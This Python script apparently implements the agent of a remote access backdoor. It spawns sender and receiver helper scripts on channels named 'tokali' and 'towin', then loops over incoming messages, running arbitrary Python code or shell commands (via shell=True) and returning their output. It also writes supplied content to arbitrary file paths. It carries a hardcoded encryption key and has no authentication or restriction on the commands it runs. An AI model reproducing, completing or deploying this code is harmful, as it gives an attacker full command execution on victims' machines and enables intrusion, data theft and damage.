import threading
import subprocess
from pipefile import *

encryption_key = b'GiQU2kTUkYUUpm10MgpJ5uCr2m-cB7tEuQ2YJ7yyxN0='

send_channel = 'tokali'  # input("send_channel:")
receive_channel = 'towin'  # input("receive_channel:")


# thread scripts
def run_script(script_name, channel):
    global encryption_key
    subprocess.run(["python", script_name] + [encryption_key, channel])


def main():
    while True:
        try:
            command, payload = listen_file("income").split(' ', 1)

            if command == 'python':

                try:
                    result = subprocess.run(['python', '-c', payload], capture_output=True, text=True)

                    post_file(result.stdout + result.stderr, "result")

                except Exception as e:
                    post_file(f'python failed: {e}', "result")

            if command == 'cmd':

                try:
                    result = subprocess.run(payload, shell=True, capture_output=True, text=True)

                    post_file(result.stdout + result.stderr, "result")

                except Exception as e:
                    post_file(f'cmd failed: {e}', "result")

            if command == 'file':
                filename, payload = payload.split(' ', 1)

                with open(filename, 'w') as file:
                    # You can write content to the file if needed
                    file.write(payload)

        except Exception as e:
            post_file(f'filed: {e}', "result")


if __name__ == "__main__":
    sender = threading.Thread(target=run_script, args=("sender.py", send_channel))
    receiver = threading.Thread(target=run_script, args=("receiver.py", receive_channel))
    run_main = threading.Thread(target=main)

    sender.start()
    receiver.start()
    run_main.start()

    sender.join()
    receiver.join()
    run_main.join()
